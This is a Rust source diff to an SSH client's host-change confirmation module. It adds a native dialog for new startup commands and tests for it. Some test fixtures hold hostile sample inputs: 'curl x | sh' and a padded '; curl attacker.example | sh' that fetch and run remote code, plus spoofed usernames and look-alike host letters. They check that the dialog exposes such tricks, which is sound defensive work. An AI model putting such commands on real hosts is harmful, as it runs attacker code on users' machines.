@@ -1,5 +1,5 @@
 //! Native confirmation for host and identity writes that let a vault key sign
-//! in somewhere new.
+//! in somewhere new, or give a host a startup command it did not have.
 //!
 //! The page writes the store, and a saved host that signs in with a vault key
 //! is a standing permission: use this key, as this account, against this
@@ -14,10 +14,17 @@
 //!
 //! What the dialog lists is worked out here from the store as it would stand
 //! after the write, and a key is named from the vault's own metadata, so the
-//! page never supplies a description of its own change. Writes that grant
-//! nothing new go through without a question: renames, tags, groups, password
-//! hosts, startup commands, and any edit that leaves every host's key reach
-//! where it was.
+//! page never supplies a description of its own change.
+//!
+//! A startup command is typed into the shell on every connect, so one the
+//! page stores keeps running long after the page that wrote it, and nothing on
+//! the way to a connection shows it. A write that puts a command on a host, or
+//! changes the one it has, is confirmed in the same dialog; see
+//! `clavyn_core::startup_command`.
+//!
+//! Writes that introduce neither go through without a question: renames, tags,
+//! groups, password hosts, clearing a command, and any edit that leaves every
+//! host's key reach and command where they were.
 //!
 //! This guards against a page acting without the user, not against the user.
 //! Whoever clicks Allow has allowed it.
@@ -25,7 +32,8 @@
 use crate::host_key_prompt::{self, PromptGate};
 use clavyn_core::key_reach::NewReach;
 use clavyn_core::keys::KeyMeta;
-use clavyn_core::store::{Store, StoreData};
+use clavyn_core::startup_command::NewCommand;
+use clavyn_core::store::{Introduced, Store, StoreData};
 use clavyn_core::CoreError;
 use std::time::Duration;
 use tauri::AppHandle;
@@ -38,6 +46,9 @@ use uuid::Uuid;
 pub const DECLINED: &str = "[host-change-confirmation-declined]";
 
 const TITLE: &str = "Allow a vault key to be used";
+
+/// The title when the change sets startup commands and no key reach.
+const COMMAND_TITLE: &str = "Allow a startup command";
 
 /// The most hosts one dialog asks about. Every host it asks about is listed in
 /// full, because Allow must never approve a destination the dialog did not
@@ -81,7 +92,7 @@ pub fn gate() -> PromptGate {
 }
 
 /// Apply `edit` to the store, asking `confirm` first when the write would let a
-/// vault key sign in somewhere new.
+/// vault key sign in somewhere new or give a host a new startup command.
 ///
 /// The decision and a write that needs no question happen under one lock, so
 /// nothing can slip in between deciding "nothing new" and writing. The lock is
@@ -99,24 +110,24 @@ pub async fn write_confirmed<E, F, Fut>(
 ) -> Result<(), String>
 where
     E: Fn(&mut StoreData),
-    F: FnOnce(Vec<NewReach>) -> Fut,
+    F: FnOnce(Introduced) -> Fut,
     Fut: std::future::Future<Output = Result<(), String>>,
 {
     let (shown, seen) = {
         let mut store = store.lock().await;
         // A write that introduces nothing is settled in this one pass. `Store`
         // refuses and rolls back one that does, which is the case to ask about.
-        match store.commit_confirmed(&edit, &[]) {
-            Err(CoreError::UnconfirmedKeyReach) => {}
+        match store.commit_confirmed(&edit, &Introduced::default()) {
+            Err(CoreError::UnconfirmedKeyReach | CoreError::UnconfirmedStartupCommand) => {}
             written => return written.map_err(|e| e.to_string()),
         }
         (store.preview(&edit), store.data().access_copy())
     };
-    if shown.len() > LISTED_HOSTS {
+    let listed = shown.reaches.len() + commands_apart(&shown).len();
+    if listed > LISTED_HOSTS {
         return Err(format!(
-            "this change would let a vault key sign in at {} hosts where no saved host lets it sign \
-             in yet, more than the {LISTED_HOSTS} one confirmation can list; {SMALLER_STEPS}",
-            shown.len()
+            "this change would need confirming at {listed} hosts, more than the {LISTED_HOSTS} one \
+             confirmation can list; {SMALLER_STEPS}"
         ));
     }
     confirm(shown.clone()).await?;
@@ -125,7 +136,9 @@ where
         return Err(CHANGED_DURING_DIALOG.to_string());
     }
     store.commit_confirmed(&edit, &shown).map_err(|e| match e {
-        CoreError::UnconfirmedKeyReach => CHANGED_DURING_DIALOG.to_string(),
+        CoreError::UnconfirmedKeyReach | CoreError::UnconfirmedStartupCommand => {
+            CHANGED_DURING_DIALOG.to_string()
+        }
         e => e.to_string(),
     })
 }
@@ -139,21 +152,26 @@ const CHANGED_DURING_DIALOG: &str =
 const SMALLER_STEPS: &str = "make it in smaller steps, a few hosts at a time (for an identity, \
      unlink some of its hosts first, change the identity, then link them back a few at a time)";
 
-/// Ask the user, in a native dialog, to allow `reaches`. `keys` is the vault's
-/// key metadata, or `None` while the vault is locked.
+/// Ask the user, in a native dialog, to allow what `introduced` lists. `keys`
+/// is the vault's key metadata, or `None` while the vault is locked.
 pub async fn confirm(
     app: &AppHandle,
     gate: &PromptGate,
-    reaches: &[NewReach],
+    introduced: &Introduced,
     keys: Option<&[KeyMeta]>,
 ) -> Result<(), String> {
-    let text = checked_message(reaches, keys)?;
-    host_key_prompt::confirm(app, gate, TITLE, &text, "Allow").await
+    let text = checked_message(introduced, keys)?;
+    let title = if introduced.reaches.is_empty() {
+        COMMAND_TITLE
+    } else {
+        TITLE
+    };
+    host_key_prompt::confirm(app, gate, title, &text, "Allow").await
 }
 
-/// The dialog text for `reaches`, or why it cannot be asked as one dialog.
-fn checked_message(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> Result<String, String> {
-    let text = message(reaches, keys);
+/// The dialog text for `introduced`, or why it cannot be asked as one dialog.
+fn checked_message(introduced: &Introduced, keys: Option<&[KeyMeta]>) -> Result<String, String> {
+    let text = message(introduced, keys);
     if text.chars().count() > MESSAGE_LIMIT {
         return Err(format!(
             "the confirmation for this change would be too long to read in one dialog, so it was \
@@ -163,12 +181,62 @@ fn checked_message(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> Result<Str
     Ok(text)
 }
 
-/// The dialog text for `reaches`, every one of them listed.
+/// The commands `introduced` sets that its key reaches do not already show: a
+/// host that gets a new reach and a new command at once is listed once, with
+/// its command, among the reaches.
+fn commands_apart(introduced: &Introduced) -> Vec<&NewCommand> {
+    introduced
+        .commands
+        .iter()
+        .filter(|command| {
+            !introduced.reaches.iter().any(|new| {
+                new.host_id == command.host_id
+                    && new.startup_command.as_deref() == Some(command.command.as_str())
+            })
+        })
+        .collect()
+}
+
+/// The dialog text for `introduced`, every key reach and command listed.
 ///
 /// The account and the server are on lines of their own, because both are text
 /// the page chose and joined into one `user@host` string a username could end
 /// in a plausible host of its own.
-pub fn message(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
+pub fn message(introduced: &Introduced, keys: Option<&[KeyMeta]>) -> String {
+    let mut parts = Vec::new();
+    if !introduced.reaches.is_empty() {
+        parts.push(reaches_text(&introduced.reaches, keys));
+    }
+    let commands = commands_apart(introduced);
+    if !commands.is_empty() {
+        parts.push(commands_text(&commands));
+    }
+    let mut text = parts.join("\n\n");
+    text.push_str("\n\nAllow this only if you are making this change yourself.");
+    text
+}
+
+/// The part of the dialog that lists commands set apart from any key reach.
+fn commands_text(commands: &[&NewCommand]) -> String {
+    let mut text = String::from(
+        "This change sets a command that is typed into your shell every time you connect to:\n",
+    );
+    for new in commands {
+        text.push_str(&format!(
+            "\n{}\n    Account: {}\n    Server:  {}:{}\n    Runs on connect: {}\n",
+            shown(&new.host_label, LABEL_LIMIT),
+            shown(&new.username, LABEL_LIMIT),
+            address(&new.hostname),
+            new.port,
+            shown(&new.command, COMMAND_LIMIT),
+        ));
+    }
+    text.push_str("\nIt runs as that account on every connection until it is changed or removed.");
+    text
+}
+
+/// The part of the dialog that lists new key reaches.
+fn reaches_text(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
     let mut text = String::from(
         "This change lets a key from your vault sign in where no saved host lets it sign in \
          now:\n",
@@ -197,7 +265,7 @@ pub fn message(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
     };
     text.push_str(&format!(
         "\nThe first connection to an address trusts whichever server answers there, so the key \
-         signs in to that server{runs}. Allow this only if you are making this change yourself."
+         signs in to that server{runs}."
     ));
     text
 }
@@ -340,6 +408,21 @@ mod tests {
         }
     }
 
+    fn only_reaches(reaches: &[NewReach]) -> Introduced {
+        Introduced {
+            reaches: reaches.to_vec(),
+            commands: Vec::new(),
+        }
+    }
+
+    fn message_for(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
+        message(&only_reaches(reaches), keys)
+    }
+
+    fn checked_for(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> Result<String, String> {
+        checked_message(&only_reaches(reaches), keys)
+    }
+
     fn meta(id: Uuid, label: &str) -> KeyMeta {
         KeyMeta {
             id,
@@ -381,7 +464,8 @@ mod tests {
         let error = write_confirmed(
             &store,
             |data| data.add_host(host.clone()),
-            |reaches| {
+            |shown| {
+                let reaches = shown.reaches;
                 asked.fetch_add(1, Ordering::SeqCst);
                 assert_eq!(reaches.len(), 1);
                 assert_eq!(reaches[0].reach.hostname, "attacker.example");
@@ -413,6 +497,113 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn a_startup_command_is_asked_about_and_a_decline_writes_nothing() {
+        let (_dir, path, store) = store();
+        let host = password_host("lab.example");
+        store.lock().await.add_host(host.clone()).expect("host");
+        let mut running = host.clone();
+        running.startup_command = Some("curl x | sh".into());
+
+        let error = write_confirmed(
+            &store,
+            |data| data.update_host(running.clone()),
+            |shown| {
+                assert!(shown.reaches.is_empty());
+                assert_eq!(shown.commands.len(), 1);
+                let text = message(&shown, None);
+                assert!(text.contains("typed into your shell"), "{text}");
+                assert!(text.contains("Server:  lab.example:22\n"), "{text}");
+                assert!(text.contains("Runs on connect: curl x | sh\n"), "{text}");
+                async { Err(format!("{DECLINED} {COMMAND_TITLE}: cancelled")) }
+            },
+        )
+        .await
+        .expect_err("a declined command must not be saved");
+        assert!(error.contains(DECLINED), "{error}");
+        assert_eq!(store.lock().await.hosts()[0].startup_command, None);
+        let saved = Store::load(path.clone()).expect("reload");
+        assert_eq!(saved.hosts()[0].startup_command, None, "a declined command reached the disk");
+
+        write_confirmed(
+            &store,
+            |data| data.update_host(running.clone()),
+            |_| async { Ok(()) },
+        )
+        .await
+        .expect("a confirmed command saves");
+        let saved = Store::load(path).expect("reload");
+        assert_eq!(saved.hosts()[0].startup_command.as_deref(), Some("curl x | sh"));
+    }
+
+    #[tokio::test]
+    async fn clearing_a_startup_command_is_not_asked_about() {
+        let (_dir, _path, store) = store();
+        let mut host = password_host("lab.example");
+        host.startup_command = Some("uptime".into());
+        let confirmed = store.lock().await.preview(|data| data.add_host(host.clone()));
+        store
+            .lock()
+            .await
+            .commit_confirmed(|data| data.add_host(host.clone()), &confirmed)
+            .expect("host");
+
+        let mut cleared = host.clone();
+        cleared.startup_command = None;
+        write_confirmed(
+            &store,
+            |data| data.update_host(cleared.clone()),
+            |_| async { panic!("clearing a command must not need a confirmation") },
+        )
+        .await
+        .expect("saved");
+        assert_eq!(store.lock().await.hosts()[0].startup_command, None);
+    }
+
+    #[tokio::test]
+    async fn a_host_with_a_new_key_and_command_is_listed_once() {
+        let (_dir, _path, store) = store();
+        let mut host = key_host("prod.example", Uuid::new_v4());
+        host.startup_command = Some("tmux attach".into());
+        write_confirmed(
+            &store,
+            |data| data.add_host(host.clone()),
+            |shown| {
+                assert_eq!((shown.reaches.len(), shown.commands.len()), (1, 1));
+                let text = message(&shown, None);
+                assert_eq!(text.matches("Runs on connect: tmux attach").count(), 1, "{text}");
+                assert!(!text.contains("typed into your shell"), "{text}");
+                async { Ok(()) }
+            },
+        )
+        .await
+        .expect("saved");
+    }
+
+    #[test]
+    fn a_command_set_apart_from_a_new_reach_gets_its_own_section() {
+        let key = Uuid::new_v4();
+        let reach = new_reach("prod", "prod.example", key, None);
+        let introduced = Introduced {
+            reaches: vec![reach],
+            commands: vec![NewCommand {
+                host_id: Uuid::new_v4(),
+                host_label: "lab\nAll clear.".into(),
+                username: "deploy".into(),
+                hostname: "lab.example".into(),
+                port: 2222,
+                command: "uptime".into(),
+            }],
+        };
+        let text = message(&introduced, None);
+        assert!(text.contains("Server:  prod.example:22\n"), "{text}");
+        assert!(text.contains("typed into your shell"), "{text}");
+        assert!(text.contains("lab\\u{a}All clear."), "{text}");
+        assert!(text.contains("Server:  lab.example:2222\n"), "{text}");
+        assert!(text.contains("Runs on connect: uptime\n"), "{text}");
+        assert!(text.ends_with("Allow this only if you are making this change yourself."));
+    }
+
+    #[tokio::test]
     async fn an_identity_edit_asks_about_every_host_it_would_send_the_key_to() {
         let (_dir, _path, store) = store();
         let identity = Identity::new("ops", "root");
@@ -432,8 +623,8 @@ mod tests {
         let error = write_confirmed(
             &store,
             |data| data.update_identity(keyed.clone()),
-            |reaches| {
-                let hostnames: Vec<_> = reaches.iter().map(|r| r.reach.hostname.clone()).collect();
+            |shown| {
+                let hostnames: Vec<_> = shown.reaches.iter().map(|r| r.reach.hostname.clone()).collect();
                 assert_eq!(hostnames, ["web.example", "db.example"]);
                 async { Err("declined".to_string()) }
             },
@@ -472,9 +663,9 @@ mod tests {
         write_confirmed(
             &store,
             |data| data.update_identity(keyed.clone()),
-            |reaches| {
-                assert_eq!(reaches.len(), LISTED_HOSTS);
-                let text = message(&reaches, None);
+            |shown| {
+                assert_eq!(shown.reaches.len(), LISTED_HOSTS);
+                let text = message(&shown, None);
                 for i in 0..LISTED_HOSTS {
                     assert!(
                         text.contains(&format!("Server:  h{i}.example:22")),
@@ -526,8 +717,8 @@ mod tests {
         let error = write_confirmed(
             &store,
             |data| data.add_identity(identity.clone()),
-            move |reaches| async move {
-                assert_eq!(reaches.len(), 1);
+            move |shown| async move {
+                assert_eq!(shown.reaches.len(), 1);
                 let mut second = password_host("attacker.example");
                 second.identity_id = Some(linked);
                 concurrent
@@ -627,7 +818,7 @@ mod tests {
     #[test]
     fn the_message_names_the_destination_key_and_command() {
         let key = Uuid::new_v4();
-        let text = message(
+        let text = message_for(
             &[new_reach(
                 "evil",
                 "attacker.example",
@@ -650,7 +841,7 @@ mod tests {
     #[test]
     fn a_locked_vault_names_the_key_by_id() {
         let key = Uuid::new_v4();
-        let text = message(&[new_reach("prod", "prod.example", key, None)], None);
+        let text = message_for(&[new_reach("prod", "prod.example", key, None)], None);
         assert!(
             text.contains(&format!("Key:     {key} (unlock the vault")),
             "{text}"
@@ -659,14 +850,14 @@ mod tests {
         assert!(!text.contains("the command runs"), "{text}");
 
         let other = Uuid::new_v4();
-        let text = message(&[new_reach("prod", "prod.example", other, None)], Some(&[]));
+        let text = message_for(&[new_reach("prod", "prod.example", other, None)], Some(&[]));
         assert!(text.contains("which is not in the vault"), "{text}");
     }
 
     #[test]
     fn stored_text_cannot_redraw_the_dialog() {
         let key = Uuid::new_v4();
-        let text = message(
+        let text = message_for(
             &[new_reach(
                 "prod\n\nThis is a routine update.",
                 "attacker.example\u{202E}",
@@ -731,7 +922,7 @@ mod tests {
         let key = Uuid::new_v4();
         let tail = "; curl attacker.example | sh";
         let padded = format!("{}{tail}", " ".repeat(COMMAND_LIMIT));
-        let text = message(
+        let text = message_for(
             &[new_reach("prod", "prod.example", key, Some(&padded))],
             None,
         );
@@ -744,7 +935,7 @@ mod tests {
         let key = Uuid::new_v4();
         let mut reach = new_reach("prod", "attacker.example", key, None);
         reach.reach.username = "root@prod.internal.example:22".into();
-        let text = message(&[reach], None);
+        let text = message_for(&[reach], None);
         // The account and the server are on lines of their own, so the text a
         // username ends in is never read as the destination.
         assert!(
@@ -760,7 +951,7 @@ mod tests {
     fn look_alike_host_letters_are_escaped() {
         let key = Uuid::new_v4();
         // A Cyrillic o in place of the Latin one.
-        let text = message(&[new_reach("prod", "pr\u{43E}d.example", key, None)], None);
+        let text = message_for(&[new_reach("prod", "pr\u{43E}d.example", key, None)], None);
         assert!(text.contains("Server:  pr\\u{43e}d.example:22"), "{text}");
         // Ordinary host names are untouched, upper case and digits included.
         assert_eq!(address("Web-01.Example.com"), "Web-01.Example.com");
@@ -792,7 +983,7 @@ mod tests {
             })
             .collect();
         let keys = [meta(key, "work laptop")];
-        let text = checked_message(&reaches, Some(&keys)).expect("an ordinary change was refused");
+        let text = checked_for(&reaches, Some(&keys)).expect("an ordinary change was refused");
         assert!(text.chars().count() <= MESSAGE_LIMIT);
     }
 
@@ -803,7 +994,7 @@ mod tests {
         let reaches: Vec<_> = (0..LISTED_HOSTS)
             .map(|_| new_reach(&long, &long, key, Some(&long)))
             .collect();
-        let error = checked_message(&reaches, None).expect_err("a huge dialog was built");
+        let error = checked_for(&reaches, None).expect_err("a huge dialog was built");
         assert!(error.contains("too long to read in one dialog"), "{error}");
         assert!(!error.contains(DECLINED), "{error}");
     }
@@ -811,7 +1002,7 @@ mod tests {
     #[test]
     fn an_ipv6_address_is_bracketed_so_the_port_reads_apart() {
         let key = Uuid::new_v4();
-        let text = message(&[new_reach("v6", "2001:db8::1", key, None)], None);
+        let text = message_for(&[new_reach("v6", "2001:db8::1", key, None)], None);
         assert!(text.contains("Server:  [2001:db8::1]:22"), "{text}");
     }
 }
